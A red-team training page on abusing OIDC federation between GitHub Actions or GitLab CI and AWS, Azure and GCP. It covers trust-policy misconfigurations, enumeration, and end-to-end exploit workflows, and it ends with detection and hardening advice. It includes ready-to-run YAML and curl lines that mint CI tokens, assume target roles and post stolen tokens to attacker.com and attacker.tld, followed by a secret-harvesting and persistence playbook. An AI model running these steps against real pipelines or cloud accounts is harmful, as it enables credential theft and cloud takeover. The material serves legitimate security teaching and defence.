---
layout: training-page
title: "OIDC Trust Abuse — GitHub Actions, GitLab CI → Cloud — Red Team Academy"
module: "Red Team Tools"
tags:
  - oidc
  - github-actions
  - gitlab-ci
  - federation
  - cloud
  - iam
  - sts
  - workload-identity
page_key: "cloud-oidc-trust-abuse"
render_with_liquid: false
---

# OIDC Trust Abuse — GitHub Actions, GitLab CI → Cloud

OpenID Connect (OIDC) federation between CI/CD platforms and cloud providers replaced long-lived access keys in CI as the recommended pattern from 2022 onward. The model is good for defenders — no static secret to leak — and the model is *also* good for attackers, because OIDC trust policies are written by application engineers under deadline, frequently misconfigured, and rarely audited. A single overly-permissive `sub` claim filter on an IAM role can hand any repository on GitHub.com the ability to assume that role.

This page covers how cloud-to-CI OIDC trust works, the specific misconfiguration classes, the enumeration techniques that surface attackable trust policies, and the post-assumption playbook once a federation hop lands.

## How OIDC Federation Works (Just Enough)

```
+---------------------+      +-----------------------+       +----------------+
|  GitHub / GitLab    |      |  AWS STS / Azure AD / |       |   Cloud        |
|  CI runner          |      |  GCP / Workload IdP   |       |   resources    |
|                     |      |                       |       |                |
|  1) Job starts      |      |                       |       |                |
|  2) Mints OIDC      |      |                       |       |                |
|     token w/ claims |      |                       |       |                |
|  3) Calls STS       |----->|  4) Validates JWT,    |       |                |
|     AssumeRoleWith- |      |     checks "sub"      |       |                |
|     WebIdentity     |      |     against trust     |       |                |
|                     |<-----|  5) Returns short-    |       |                |
|                     |      |     lived creds       |       |                |
|                     |      |                       |       |                |
|                     |      |                       |       |   6) Use creds |
|                     |--------------------------------------|----> as role   |
+---------------------+      +-----------------------+       +----------------+
```

The CI runner mints a signed JWT containing a `sub` claim that identifies the workflow context. The cloud IdP validates the JWT signature (the IdP's public keys are at a well-known URL) and checks that the `sub` claim matches the trust policy. If both pass, short-lived cloud credentials are returned.

The attacker target is the `sub`-claim filter in the trust policy. Get a workflow whose JWT `sub` matches that filter, and you get the role.

## Claim Anatomy — What's in the Token

A real GitHub Actions OIDC token decoded:

```json
{
  "iss": "https://token.actions.githubusercontent.com",
  "sub": "repo:octo-org/octo-repo:ref:refs/heads/main",
  "aud": "https://github.com/octo-org",
  "repository": "octo-org/octo-repo",
  "repository_owner": "octo-org",
  "ref": "refs/heads/main",
  "ref_type": "branch",
  "head_ref": "",
  "base_ref": "",
  "event_name": "push",
  "workflow": "Deploy",
  "actor": "octocat",
  "environment": "production",
  "job_workflow_ref": "octo-org/octo-repo/.github/workflows/deploy.yml@refs/heads/main",
  "iat": 1700000000,
  "exp": 1700003600
}
```

Every field is attacker-controlled to some degree:

- `repository` — controlled by anyone who can push code or open a PR
- `ref` / `ref_type` — controlled by who can create branches or tags
- `head_ref` / `base_ref` — controlled by PR opener
- `workflow` — controlled by anyone who can edit `.github/workflows/`
- `environment` — controlled by who can dispatch workflows that target that environment
- `actor` — controlled by whose token is running the job
- `job_workflow_ref` — controlled by who controls the workflow file

The cloud-side trust policy is supposed to narrow which combinations are allowed. When it doesn't narrow correctly, the role is takeable.

## The Classic Misconfigurations

### Wildcarded repository

```json
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:*"
    }
  }
}
```

This trust policy allows **any** GitHub Actions workflow in **any** repository on GitHub.com to assume the role. The fix is `"repo:octo-org/octo-repo:*"`, but the wildcard is a common copy-paste failure.

### Missing org constraint

```json
"StringLike": {
  "token.actions.githubusercontent.com:sub": "repo:*:ref:refs/heads/main"
}
```

Restricts to `main` branch but allows any org. Attacker creates `attacker-org/anything` with a `main` branch and a workflow that calls `aws-actions/configure-aws-credentials`.

### Missing branch constraint

```json
"StringLike": {
  "token.actions.githubusercontent.com:sub": "repo:target-org/target-repo:*"
}
```

Restricts to the right repo but allows any branch, any tag, any pull-request context. An attacker who can open a PR (forks are sufficient for `pull_request_target` events) can mint a token with `sub: repo:target-org/target-repo:pull_request`. If the trust policy uses `StringLike` with `repo:target-org/target-repo:*`, that PR claim matches.

### `pull_request_target` poisoning

Workflows using `pull_request_target:` run with **secrets exposed** even on PRs from forks. If such a workflow does `actions/checkout` on the PR's HEAD and runs anything (build, test, lint), the attacker's PR code executes inside a runner that has the OIDC token. From there:

```yaml
# In attacker's PR — Makefile or build script
echo "$AWS_WEB_IDENTITY_TOKEN_FILE"
cat $AWS_WEB_IDENTITY_TOKEN_FILE | base64
# Or even simpler — exfil the OIDC token directly
curl "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" \
  -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  | jq -r .value > token.jwt
# Send to attacker collector
curl -X POST https://attacker.com/log -d @token.jwt
```

### Audience confusion

The `aud` claim in the OIDC token is checkable by the cloud IdP. Some trust policies forget to constrain it. Default GitHub Actions audience is `sts.amazonaws.com` for AWS but can be requested as anything. A trust policy that ignores `aud` allows cross-service token reuse — a token minted for one service replayed against another role.

## AWS-Specific Trust Policy Pitfalls

```
# Common: too-permissive condition
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
  },
  "StringLike": {
    "token.actions.githubusercontent.com:sub": "repo:my-org/*"
  }
}

# Better: constrain by environment or by full job ref
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:job_workflow_ref": "my-org/my-repo/.github/workflows/deploy.yml@refs/heads/main"
  }
}
```

The `job_workflow_ref` claim is the strongest constraint because it includes the workflow file path and ref. Modifying it requires write access to the specific file on that ref.

## Azure-Specific (Federated Credentials on App Registrations)

```
# Federated Credential subject pattern (Azure)
"subject": "repo:octo-org/octo-repo:environment:production",
"audiences": ["api://AzureADTokenExchange"],
"issuer": "https://token.actions.githubusercontent.com"
```

Azure App Registrations support federated credentials. The same `sub` wildcarding bugs apply. The "environment" claim is often used as the only narrowing constraint — but environments can be created with permissive deployment branch policies. An operator who can dispatch workflows from any branch can mint tokens against the production environment if branch protection on the environment side is loose.

## GCP-Specific (Workload Identity Federation)

```
# GCP attribute mapping
attribute.repository = assertion.repository
attribute.repository_owner = assertion.repository_owner
attribute.ref = assertion.ref

# Service account impersonation policy
member: principalSet://iam.googleapis.com/projects/PROJ/locations/global/workloadIdentityPools/POOL/attribute.repository_owner/octo-org
role: roles/iam.workloadIdentityUser
```

The GCP attribute-mapping language is expressive but tricky. Mapping `attribute.repository = assertion.repository` and then binding `attribute.repository_owner` to `octo-org` means any repo under `octo-org` can impersonate the service account. Including forks of public repos that an attacker can push to via PR.

## Enumeration — Finding Vulnerable Trust Policies

### From inside an AWS account (white-box / partial)

```
# Enumerate IAM roles that trust GitHub OIDC
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument, `token.actions.githubusercontent.com`) == `true`].RoleName'

# Pull each trust policy and parse for wildcards
for role in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do
  aws iam get-role --role-name "$role" --query 'Role.AssumeRolePolicyDocument' \
    --output json > "/tmp/$role.json"
done

# Search for the bug patterns
grep -l '"repo:\*"' /tmp/*.json                         # any-repo
grep -l '"token.actions.githubusercontent.com:sub": "\*"' /tmp/*.json
grep -l 'repository:\*"' /tmp/*.json
```

### From outside (black-box, harder)

The trust policy is not public, so direct enumeration is impossible. The attacker must either:

1. **Find leaked Terraform/CloudFormation** in public repos that reveals the trust policy.
2. **Guess based on repo structure** — many orgs deploy a role per repo named `gh-actions-<reponame>` or `github-<reponame>-deploy`. With one valid OIDC token (from any workflow they can trigger), the attacker calls `sts:AssumeRoleWithWebIdentity` against guessed role ARNs.
3. **GitHub Actions logs** — public repo build logs sometimes echo the assumed role ARN.

```
# Black-box assume attempt
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::TARGET_ACCOUNT:role/gh-actions-deploy \
  --role-session-name oidc-test \
  --web-identity-token "$(cat token.jwt)"
```

## Exploitation — End-to-End

### Scenario: target uses a too-broad `repo:target-org/*` trust

Step 1: Discover the role ARN (via a leaked Terraform repo in the target org, found by GitHub code search).

```
# GitHub code search for trust policy snippets
# Examples (use the actual search UI):
# - "arn:aws:iam::" "AssumeRoleWithWebIdentity" extension:tf
# - "token.actions.githubusercontent.com" extension:yml repo:target-org
# - "configure-aws-credentials" extension:yml repo:target-org
```

Step 2: Create attacker repo `attacker-handle/exploit-repo` and a workflow that requests the OIDC token and assumes the role.

```yaml
# .github/workflows/take.yml
name: take
on: push
permissions:
  id-token: write
  contents: read
jobs:
  take:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::TARGET_ACCOUNT:role/gh-actions-deploy
          aws-region: us-east-1
      - run: |
          aws sts get-caller-identity
          aws s3 ls
          aws iam list-attached-role-policies --role-name gh-actions-deploy
```

This only works if the trust policy is **too** broad — `repo:*` (any repo) or `repository_owner:*` (any owner). For a `repo:target-org/*` trust, the attacker's repo `attacker-handle/exploit-repo` won't match.

### Scenario: target uses `repo:target-org/target-repo:*` and accepts PRs

The attacker forks `target-org/target-repo`, opens a PR with a modified workflow file or a modified Makefile that calls a CI step. If the target's CI uses `pull_request_target:` and runs build commands on PR code, the attacker's code runs in a runner that can request the OIDC token.

```yaml
# Attacker's PR adds this to a build script the CI runs
- name: Build
  run: |
    # Request an OIDC token and dump it
    TOKEN=$(curl -sS \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" \
      -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      | jq -r .value)
    # Either use it locally:
    aws sts assume-role-with-web-identity \
      --role-arn arn:aws:iam::TARGET_ACCOUNT:role/gh-actions-deploy \
      --role-session-name pwn \
      --web-identity-token "$TOKEN"
    # Or exfil for offline use:
    curl -X POST https://attacker.tld/log -d "$TOKEN"
```

### Scenario: GitLab CI to GCP

```yaml
# .gitlab-ci.yml from an attacker-controlled project on the same GitLab instance
deploy:
  image: google/cloud-sdk:slim
  id_tokens:
    GCP_TOKEN:
      aud: https://iam.googleapis.com/projects/TARGET_PROJ/locations/global/workloadIdentityPools/POOL/providers/PROVIDER
  script:
    - echo "$GCP_TOKEN" > /tmp/token.jwt
    - gcloud iam workload-identity-pools create-cred-config \
        projects/TARGET_PROJ/locations/global/workloadIdentityPools/POOL/providers/PROVIDER \
        --service-account=target-sa@TARGET_PROJ.iam.gserviceaccount.com \
        --credential-source-file=/tmp/token.jwt \
        --output-file=/tmp/sts.json
    - gcloud auth login --cred-file=/tmp/sts.json
    - gcloud projects list
```

If the workload identity pool's attribute mapping uses `assertion.namespace_path` or `assertion.project_path` with a wildcard, any GitLab project on the same instance can impersonate the service account.

## Post-Assumption Playbook

The OIDC hop lands the operator inside the target cloud as a specific role. From there, standard cloud red team applies, but with a CI-deploy-role-shaped permission set:

1. **Map the role's permissions** — `aws iam list-attached-role-policies` plus the inline policies. CI deploy roles are commonly broader than they need to be.
2. **Pivot via IAM** — if the role has `iam:PassRole` or `iam:CreatePolicy`, escalate to admin via known pmapper-style chains.
3. **Read every secret** — `aws secretsmanager list-secrets` then bulk-read. CI deploy roles often have `secretsmanager:GetSecretValue` to pull DB credentials at deploy time.
4. **Read SSM Parameter Store** — same pattern. Often contains the org's runtime config including third-party API keys, database connection strings.
5. **Read CodeCommit / S3 source buckets** — sometimes the CI role can pull from S3-hosted artifacts that include secrets.
6. **Persist** — if `iam:CreateAccessKey` is in scope on a target user, persist outside OIDC.

## Detection — What Blue Should See

- **CloudTrail `AssumeRoleWithWebIdentity` events** with the `sub` claim recorded. Anomalies: a `sub` containing a previously-unseen repo path, an unexpected workflow file, or a PR ref on a role that normally only fires on `main`.
- **Source-IP anomalies** — GitHub Actions runners come from a documented IP range. Tokens used from elsewhere are suspect.
- **Concurrency anomalies** — sudden bursts of assume calls.
- **PR-context tokens** — any role used from a `pull_request` `sub` context should be loud unless the workflow explicitly opts in.
- **GitHub repository creation under a watched org** combined with workflow files that target known internal role ARNs.

Most orgs have weeks-old log retention, no parsing of the `sub` claim, and no anomaly detection across CloudTrail events. The detection bar is achievable but rarely achieved.

## Tools

- **`gato`** (Praetorian) — Self-hosted GitHub Actions runner attack tool. Enumerates accessible repos and finds attack paths.
- **`tarian`** — GitHub Actions security scanner.
- **`octoscan`** — Workflow misconfiguration scanner; flags `pull_request_target` + checkout patterns and dangerous expression usage.
- **`hardenedmask`** — Trust policy auditor for OIDC providers in AWS.
- **`checkov`** / **`tfsec`** — Terraform linters that catch OIDC trust wildcards in IaC.
- **`prowler`** — Has OIDC trust-policy checks under IAM benchmark.
- **`pacu`** — Module `iam__assume_role` and `iam__enum_users_roles_policies_groups` for post-assumption exploration.

## Defensive Recommendations

For the engagement report:

1. **Lock `sub` to `job_workflow_ref`** including the file path and ref — strongest single control.
2. **Constrain by environment** plus a deployment branch policy on that environment.
3. **Never use `pull_request_target` with checkout of PR code** unless the workflow is read-only and exposes no secrets.
4. **Per-repo roles, not per-org roles.** Blast radius compounds when one role trusts many repos.
5. **CloudTrail + KQL/Athena rules** on `AssumeRoleWithWebIdentity` events that flag any new `sub` value, especially PR-context.
6. **Periodic trust-policy audit** — run `checkov`/`tfsec` against IaC, plus a runtime sweep of the live trust policies (they drift from IaC).
7. **Branch protection on `main` and on environment-bound branches** — without this, anyone who can push to `main` mints production tokens.

## Resources

- GitHub Docs, "Security hardening your deployments — About security hardening with OpenID Connect"
- Praetorian, "Self-Hosted GitHub Runners Are Backdoors" (gato research)
- Aqua Security, "Don't trust the actor — the dangers of `pull_request_target`"
- AWS IAM documentation, "Configuring a role for GitHub OIDC"
- Microsoft Entra documentation, "Configure an app to trust an external IdP (Federated credentials)"
- Google Cloud documentation, "Workload Identity Federation for GitHub"
- Rhino Security Labs, "GCP OIDC Misconfiguration Research"
- Datadog Security Research, "OIDC trust policy abuse in the wild" (2024)
